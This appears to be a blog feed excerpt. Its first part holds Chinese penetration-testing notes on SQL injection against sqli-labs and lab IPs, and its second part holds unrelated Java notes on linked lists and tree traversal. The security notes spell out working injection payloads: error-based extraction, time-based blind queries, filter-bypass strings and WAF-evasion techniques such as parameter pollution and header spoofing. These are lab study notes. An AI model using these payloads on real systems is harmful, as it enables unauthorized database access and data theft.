<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extractvalue()：</span><br><span class="line">	MySQL中的XML函数，使用Xpath符号从xml字符串中提取值。extractvalue(目标xml文档，xml路径)</span><br><span class="line">	extractvalue()能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用substring()函数截取，一次查看32位</span><br><span class="line">列子：</span><br><span class="line">	表名：</span><br><span class="line">	http://222.18.158.243:4607/?</span><br><span class="line">	id=1 and extractvalue(1,concat(0x7e,0x7e,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1)))</span><br></pre></td></tr></table></figure>

<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">updatexml()：</span><br><span class="line">	MySQL中的XML函数，返回被替换的XML段。</span><br><span class="line">	updatexml(目标xml文档，xml路径，更新的内容)</span><br><span class="line">	公式:and updatexml(0x23,sql语句,1)</span><br><span class="line">		同样，这里也是使用的是and 所以需要保证前面的用户名存在</span><br><span class="line">例子：</span><br><span class="line">	http://222.18.158.243:4608/?</span><br><span class="line">	id=1 and updatexml(0x3a,concat(user(),0x3a,0x3a,database()),1)</span><br><span class="line">	http://222.18.158.243:4608/?</span><br><span class="line">	id=1 and updatexml(0x3a,concat(1,0x3a,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,1)),1)</span><br><span class="line">	</span><br><span class="line">一般修改密码的时候是需要根据用户名来查询该用户是否存在，如果存在才需要修改密码，并且，修改密码的数据是如下所示的，所以，其注入点应该是在password里</span><br><span class="line">	&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<h2 id="基于时间的盲注："><a href="#基于时间的盲注：" class="headerlink" title="基于时间的盲注："></a>基于时间的盲注：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">没有任何的报错信息，只能靠时间线的长短来判断。</span><br><span class="line">length（）返回字符串的长度</span><br><span class="line">ascii()返回字符的ASCII码值</span><br><span class="line">substr(string,from,total),对string字符串进行截取，从第from个字符开始，总共截取 total个字符。</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">	IF(Condition,A,B)：当Condition为TRUE时，返回A；当Condition为FALSE时，返回B。</span><br><span class="line">   获得字段个数：3</span><br><span class="line">	http://222.18.158.243:4609/?</span><br><span class="line">	id=1 and if((select count(column_name) from information_schema.columns where table_name= &#x27;users&#x27;)=3,sleep(1),1)</span><br><span class="line">	现在通过二分法来猜测数据库的数据库名字：</span><br><span class="line">	http://222.18.158.243:4609/?</span><br><span class="line">	id=1 and if(ascii(substr(database(),1,1))&gt;0x61,sleep(1),1)</span><br><span class="line">	</span><br><span class="line">	#注意and前面的参数需要成真，才可以顺利进行盲注</span><br></pre></td></tr></table></figure>

<p>benchmark()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BENCHMARK(count,expr) 函数重复count次执行表达式expr，它可以用于计时MySQL处理表达式有多快，结果值总是0。</span><br><span class="line">其中所用到的函数：</span><br><span class="line">	length（）返回字符串的长度，</span><br><span class="line">	ascii()返回字符的ASCII码值，</span><br><span class="line">	substr(string,from,total),对string字符串进行截取，从第from个字符开始，总共截取 total个字符。</span><br><span class="line">benchmark函数和sleep类似。由测试可知，benchmark(1000000,md5(&#x27;123&#x27;))执行的时间大约是240-250ms之间。</span><br><span class="line"></span><br><span class="line">猜测数据库用户名的长度：</span><br><span class="line">	http://222.18.158.243:4610/?</span><br><span class="line">	id= 1 and if(length(user())=18,benchmark(1000000,md5(&#x27;123&#x27;)),1)</span><br><span class="line">基于bool-逻辑判断</span><br><span class="line">regexp,like,ascii,left,ord,mid</span><br><span class="line"></span><br><span class="line">基于时间的SQL盲注-延时判断:</span><br><span class="line">if sleep</span><br><span class="line"></span><br><span class="line">基于报错的SQL盲注-报错回显:</span><br><span class="line">floor,updatexml,extractvalue</span><br><span class="line">https://www.jianshu.com/p/bc35f8dd4f7c</span><br><span class="line"></span><br><span class="line">like &#x27;ro%&#x27;	判断ro或ro...是否成立</span><br><span class="line">regexp &#x27;^temp[a-z]&#x27;	匹配temp或temp...等</span><br><span class="line">if(condition,5,0)	如果条件成立返回5，否则返回0</span><br><span class="line">sleep(5)	延迟执行5秒</span><br><span class="line">mid(a,b,c)	从b位置开始，截取a字符串的c位</span><br><span class="line">substr(a,b,c)	从位置b开始，截取字符串a的c长度</span><br><span class="line">left(database(),1),database() left(a,b)从左侧截取A的前b位</span><br><span class="line">length(database()=8)	判断数据库名的长度是否是8</span><br><span class="line">ord=ascii ascii(x)=97 判断x的ASCII码是否是97</span><br></pre></td></tr></table></figure>

<h1 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h1><p>过滤了特殊符号的字符型注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function blacklist($id)&#123;</span><br><span class="line">	$id= preg_replace(&#x27;/or/i&#x27;,&quot;&quot;, $id);			//strip out OR (non case sensitive)</span><br><span class="line">	$id= preg_replace(&#x27;/and/i&#x27;,&quot;&quot;, $id);		//Strip out AND (non case sensitive)</span><br><span class="line">	$id= preg_replace(&#x27;/[\/\*]/&#x27;,&quot;&quot;, $id);		//strip out /*</span><br><span class="line">	$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);		//Strip out --</span><br><span class="line">	$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);			//Strip out #</span><br><span class="line">	$id= preg_replace(&#x27;/[\s]/&#x27;,&quot;&quot;, $id);		//Strip out spaces</span><br><span class="line">	$id= preg_replace(&#x27;/[\/\\\\]/&#x27;,&quot;&quot;, $id);		//Strip out slashes</span><br><span class="line">	return $id;</span><br><span class="line">&#125;</span><br><span class="line">过滤了OR,AND,*,--,#,空格,\</span><br><span class="line">找注入点</span><br><span class="line">http://222.18.158.243:4603/?id=1     #注意显示内容，WHERE id=&#x27;1&#x27;，</span><br><span class="line">http://222.18.158.243:4603/?id=1&#x27;  #无任何显示 ，注意，与第1题相比多了一个’</span><br><span class="line"></span><br><span class="line">因为有过滤，所以order by \and 等命令都不能使用。</span><br><span class="line">用o/**/rder来绕过or过滤</span><br><span class="line">用a/**/nd 来绕过and过滤，或者使ID=0来强制报错</span><br><span class="line">把注释改为；%00截断</span><br><span class="line">%a0表示空格</span><br></pre></td></tr></table></figure>

<p>过滤了逗号的字符型注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">    if(stripos($id,&#x27;,&#x27;))&#123;		//stripos函数作用：查找 &quot;php&quot; 在字符串中第一次出现的位置</span><br><span class="line">      $id=&#x27;1&#x27;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">      $id=$id;</span><br><span class="line">    &#125;</span><br><span class="line">	return $id;</span><br><span class="line">&#125;</span><br><span class="line">过滤了逗号，在注入语句中使用join函数可以绕过</span><br><span class="line">join函数：联合查询，inner join，left join，right join</span><br><span class="line">http://222.18.158.243:4604/</span><br><span class="line">?id=1&#x27; and 1=2 union select * from ((select 1)a join (select 2)b JOIN (select SCHEMA_NAME from information_schema.SCHEMATA limit 1 offset 1)c)%23</span><br><span class="line">加解密注入：</span><br><span class="line">	有些时候，其参数是使用了加密之后才进行注入的</span><br><span class="line">	http://10.16.42.229/sqli-labs-master/Less-21/  cookie</span><br><span class="line">二次注入：</span><br><span class="line">	http://10.16.42.229/sqli-labs-master/Less-24/</span><br><span class="line">	先将SQL语句存入到数据库中，然后后面触发执行</span><br><span class="line">	&#x27;#</span><br><span class="line">dnslog注入漏洞(高权限)：</span><br><span class="line">	http://10.16.42.229/sqli-labs-master/Less-9/</span><br></pre></td></tr></table></figure>

<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>就是多条语句同时执行的结果，在;分号后面继续输入SQL语句，进行注入。</p>
<p><a href="http://10.16.42.229/sqli-labs-master/Less-38/">http://10.16.42.229/sqli-labs-master/Less-38/</a></p>
<p>一般使用堆叠注入进行数据插入</p>
<h1 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h1><p>绕过的基本思想如下图所示：</p>
<p><img src="file:///C:/Users/fourth/AppData/Roaming/Typora/typora-user-images/image-20211004155022791.png" alt="image-20211004155022791"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">明确网站的类型：Apache+mysql？</span><br><span class="line">绕过安全狗的URL：</span><br><span class="line">    正常：?id=-1 union select 1,2,3#</span><br><span class="line">    ?id=-1 union%23a%0Aselect 1,2,3#</span><br><span class="line">    %0A 换行</span><br><span class="line">    %23 # 注释  注释后面加上一个字符，表示的是注释</span><br><span class="line">参数污染：传递相同的参数名的不同值</span><br><span class="line">	http://10.16.42.229/sqli-labs-master/Less-2/?id=1/**&amp;id=-1%20union%20select%201,2,3%23*/</span><br><span class="line">	/***/ mysql中的注释</span><br><span class="line">	参数污染+注释，可绕过安全狗</span><br><span class="line">修改http header来bypass waf：</span><br><span class="line">	x-forward-for</span><br><span class="line">	x-remote-IP</span><br><span class="line">	x-originating-IP</span><br><span class="line">	x-remote-addr</span><br><span class="line">	x-Real-ip</span><br><span class="line">静态资源：</span><br><span class="line">	特定的静态资源后缀请求，常见的静态文件（.js .jpg.qwf .css等），类似白名单限制机制，waf为了检测效率，不去检测这样一些文件名后缀的请求。</span><br><span class="line">	http://10.16.42.229/sqli-labs-master/Less-2/?id=-1 union select 1,2,3# 被拦截</span><br><span class="line">	http://10.16.42.229/sqli-labs-master/Less-2/temp.txt?id=-1 union select 1,2,3# 成功绕过</span><br><span class="line">	Apache只识别到前面的.php/.aspx，后面的不识别</span><br><span class="line">爬虫白名单：</span><br><span class="line">URL白名单：</span><br><span class="line"></span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-2/?id=-1%20union%20/*!44509select*/%201,2,3-- </span><br><span class="line">http://10.16.42.229/sqli-labs-master/Less-2/?id=-1%20union%20all%23%0a%20select%201,2,3#</span><br><span class="line"></span><br><span class="line">sqlmap可设置绕过脚本，代理等：--temper  --proxy</span><br><span class="line">sqlmap功能尤其强大，需要好好利用，当之无愧的注入神器</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Penetration</category>
      </categories>
      <tags>
        <tag>Penetration</tag>
      </tags>
  </entry>
  <entry>
    <title>刷题-数据结构</title>
    <url>/2022/03/18/%E5%88%B7%E9%A2%98-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>写代码：<font color=red>先在草稿上面分清楚类别</font>，分析好了各个情况才开始敲代码，不然一直调试会很不方便，效率较低。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> Integer.parseInt(string) ;<span class="comment">//可以将string直接转换成int(按照十进制)</span></span><br><span class="line"><span class="type">String</span> <span class="variable">b</span> <span class="operator">=</span> String.valueOf(<span class="type">int</span>) ;<span class="comment">//可以将int直接转换成字符串 比如 1 = &quot;1&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>很多数组填充类的问题，都可以先预先给数组扩容带填充后的大小，然后在从后向前进行操作。</p>
</li>
<li><p>如果需要判断某个数据是否再一个数据结构中是否存在，则一般建议可以用哈希表</p>
</li>
<li><p>哈希表和数组再同等情况下建议用数组（时间更快）</p>
</li>
<li><p><strong>如果需要遍历整棵树，递归函数就不能有返回值。如果需要遍历某一条固定路线，递归函数就一定要有返回值！</strong></p>
</li>
</ul>
<span id="more"></span>


<h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><p>头插法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//递归</span></span><br><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">ReverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(head==<span class="literal">null</span>||head.next==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> ReverseList(head.next);</span><br><span class="line">    <span class="comment">//走到了尾节点</span></span><br><span class="line">    head.next.next = head;</span><br><span class="line">    head.next = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//循环</span></span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">ReverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">         </span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> <span class="literal">null</span>,next;</span><br><span class="line">        <span class="keyword">while</span>(head!=<span class="literal">null</span>)&#123;</span><br><span class="line">            next = head.next;</span><br><span class="line">            head.next = p;</span><br><span class="line">            p = head;</span><br><span class="line">            head = next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>找到循环链表的入口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//两个指针，一个指针一次走两步，一个指针一次走一步，第一次相遇是结束循环</span></span><br><span class="line"><span class="comment">//第二次循环时，快指针从头开始，两个指针以相同的速度来移动，则这一次相遇的时候就是链表循环的部分的入口</span></span><br><span class="line"><span class="keyword">public</span> ListNode <span class="title function_">EntryNodeOfLoop</span><span class="params">(ListNode pHead)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> pHead,slow = pHead;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(fast!=<span class="literal">null</span>&amp;&amp;fast.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">        <span class="keyword">if</span>(fast == slow)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(fast==<span class="literal">null</span> || fast.next==<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fast = pHead;</span><br><span class="line">    <span class="keyword">while</span>(fast!=slow)&#123;</span><br><span class="line">        fast = fast.next;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>复杂链表的深度拷贝：该链表包括一个随机指针，和一个next指针</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> RandomListNode <span class="title function_">Clone</span><span class="params">(RandomListNode pHead)</span> &#123;</span><br><span class="line">    <span class="type">RandomListNode</span> <span class="variable">pre</span> <span class="operator">=</span> pHead,l1 = pHead,next,p;</span><br><span class="line">    RandomListNode l2 ;</span><br><span class="line">    <span class="comment">//将所有的节点复制到本节点的下一个节点</span></span><br><span class="line">    <span class="keyword">while</span>(pHead!=<span class="literal">null</span> &amp;&amp; pre!=<span class="literal">null</span>)&#123;</span><br><span class="line">        next = pHead.next;</span><br><span class="line">        <span class="type">RandomListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomListNode</span>(pHead.label);</span><br><span class="line">        pre.next = temp;</span><br><span class="line">        pre.next.next = next;</span><br><span class="line">        pre = next;</span><br><span class="line">        pHead = next;</span><br><span class="line">    &#125;</span><br><span class="line">    pre = l1;</span><br><span class="line">    l2 = pre.next;</span><br><span class="line">    p = l2;</span><br><span class="line">    <span class="comment">//处理随机指针，复制之后的节点的随机指针指向，原来节点的随机指针的下一个节点</span></span><br><span class="line">    <span class="keyword">while</span>(pre!=<span class="literal">null</span> &amp;&amp; p!=<span class="literal">null</span> )&#123;</span><br><span class="line">        <span class="keyword">if</span>(pre.random!=<span class="literal">null</span>)&#123;</span><br><span class="line">            p.random = pre.random.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(p.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">            p = p.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pre.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">            pre = pre.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    p = l2;</span><br><span class="line">    pre = l1;</span><br><span class="line">    <span class="comment">//将两个链表分开</span></span><br><span class="line">    <span class="keyword">while</span>(pre!=<span class="literal">null</span>&amp;&amp;p!=<span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(p.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">            p.next = p.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(pre.next!=<span class="literal">null</span>)&#123;</span><br><span class="line">            pre.next = pre.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p.next;</span><br><span class="line">        pre = pre.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="树"><a href="#树" class="headerlink" title="树"></a>树</h1><blockquote>
<p>树的遍历方式：深度优先遍历、广度优先遍历（层次遍历）</p>
<p>递归和回溯是永远 在一起的，右一个递归就要有一个回溯</p>
</blockquote>
<p><font color=blue><strong>在使用递归的时候一定要右一个大局观，就是这个函数的目的是什么</strong></font>，因为很多时候都需要用到这个，需要处理返回值，比如 <code>root.left =  digui(root,left ...)</code>.</p>
<blockquote>
<ul>
<li>二叉树节点的深度：指从根节点到该节点的最长简单路径边的条数。  根节点的最小</li>
<li>二叉树节点的高度：指从该节点到叶子节点的最长简单路径边的条数   根节点最大</li>
</ul>
<p>因为求深度可以从上到下去查 所以需要<u>前序遍历（中左右）</u>，而高度只能从下到上去查，所以只能<u>后序遍历（左右中）</u></p>
</blockquote>
<p><u>递归函数注意事项：</u></p>
<ol>
<li><strong>确定递归函数的参数和返回值：</strong> 确定哪些参数是递归的过程中需要处理的，那么就在递归函数里加上这个参数， 并且还要明确每次递归的返回值是什么进而确定递归函数的返回类型。</li>
<li><strong>确定终止条件：</strong> 写完了递归算法, 运行的时候，经常会遇到栈溢出的错误，就是没写终止条件或者终止条件写的不对，操作系统也是用一个栈的结构来保存每一层递归的信息，如果递归没有终止，操作系统的内存栈必然就会溢出。</li>
<li><strong>确定单层递归的逻辑：</strong> 确定每一层递归需要处理的信息。在这里也就会重复调用自己来实现递归的过程。</li>
</ol>
<p>在一般情况下，通常考虑的不是整体的框架改变，还是改变其他的数据，比如，以之字形来遍历二叉树，二叉树的层次遍历的整体框架不变，边的只是每层访问结束之后，array这个临时变量是如何改变的。比如是否需要反转等。<code>格局打开</code></p>
<h2 id="在递归中使用栈："><a href="#在递归中使用栈：" class="headerlink" title="在递归中使用栈："></a>在递归中使用栈：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Stack;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">public class TreeNode &#123;</span></span><br><span class="line"><span class="comment">    int val = 0;</span></span><br><span class="line"><span class="comment">    TreeNode left = null;</span></span><br><span class="line"><span class="comment">    TreeNode right = null;</span></span><br><span class="line"><span class="comment">    public TreeNode(int val) &#123;</span></span><br><span class="line"><span class="comment">        this.val = val;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    ArrayList&lt;ArrayList&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    </span><br><span class="line">    Stack&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> ArrayList&lt;ArrayList&lt;Integer&gt;&gt; <span class="title function_">FindPath</span><span class="params">(TreeNode root,<span class="type">int</span> expectNumber)</span> &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        path.push(root.val);</span><br><span class="line">        <span class="keyword">if</span>(root.val==expectNumber &amp;&amp;root.left==<span class="literal">null</span>&amp;&amp;root.right==<span class="literal">null</span>)&#123;</span><br><span class="line">            result.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;(path));</span><br><span class="line">        &#125;</span><br><span class="line">        FindPath(root.left,expectNumber-root.val);</span><br><span class="line">        FindPath(root.right,expectNumber-root.val);</span><br><span class="line">        path.pop();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h2><h3 id="迭代遍历"><a href="#迭代遍历" class="headerlink" title="迭代遍历"></a>迭代遍历</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//前序遍历</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">preorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack.push(root);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">p</span>  <span class="operator">=</span> root;</span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">            p = stack.pop();</span><br><span class="line">            list.add(p.val);</span><br><span class="line">            <span class="comment">//注意这里需要的是先压入右节点，因为栈是先进后出</span></span><br><span class="line">            <span class="keyword">if</span>(p.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(p.right);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(p.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(p.left);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//中序遍历</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">// List&lt;Integer&gt; list = new ArrayList&lt;&gt;();</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line"></span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">p</span> <span class="operator">=</span> root;</span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty()||p!=<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(p!=<span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(p);</span><br><span class="line">                p = p.left;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                p = stack.pop();</span><br><span class="line">                list.add(p.val);</span><br><span class="line">                p = p.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后续遍历</span></span><br><span class="line"><span class="comment">//后续遍历可以由前序遍历反转得到（中右左反转）    前序：中左右 ，后序：左右中</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">postorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> list;</span><br><span class="line">        &#125;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack.push(root);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">p</span> <span class="operator">=</span> root;</span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">            p = stack.pop();</span><br><span class="line">            list.add(p.val);</span><br><span class="line">            <span class="keyword">if</span>(p.left!=<span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(p.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(p.right!=<span class="literal">null</span>)&#123;</span><br><span class="line">                stack.push(p.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Collections.reverse(list);</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="统一写法"><a href="#统一写法" class="headerlink" title="统一写法"></a>统一写法</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">preorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; result = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        Stack&lt;TreeNode&gt; st = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (root != <span class="literal">null</span>) st.push(root);</span><br><span class="line">        <span class="keyword">while</span> (!st.empty()) &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> st.peek();</span><br><span class="line">            <span class="keyword">if</span> (node != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">//其中各种遍历的变化就是这里，</span></span><br><span class="line">                </span><br><span class="line">                st.pop(); <span class="comment">// 将该节点弹出，避免重复操作，下面再将右中左节点添加到栈中</span></span><br><span class="line">                <span class="keyword">if</span> (node.right!=<span class="literal">null</span>) st.push(node.right);  <span class="comment">// 添加右节点（空节点不入栈）</span></span><br><span class="line">                <span class="keyword">if</span> (node.left!=<span class="literal">null</span>) st.push(node.left);    <span class="comment">// 添加左节点（空节点不入栈）</span></span><br><span class="line">                st.push(node);                          <span class="comment">// 添加中节点</span></span><br><span class="line">                st.push(<span class="literal">null</span>); <span class="comment">// 中节点访问过，但是还没有处理，加入空节点做为标记。</span></span><br><span class="line">                </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">// 只有遇到空节点的时候，才将下一个节点放进结果集</span></span><br><span class="line">                st.pop();           <span class="comment">// 将空节点弹出</span></span><br><span class="line">                node = st.peek();    <span class="comment">// 重新取出栈中元素</span></span><br><span class="line">                st.pop();</span><br><span class="line">                result.add(node.val); <span class="comment">// 加入到结果集</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


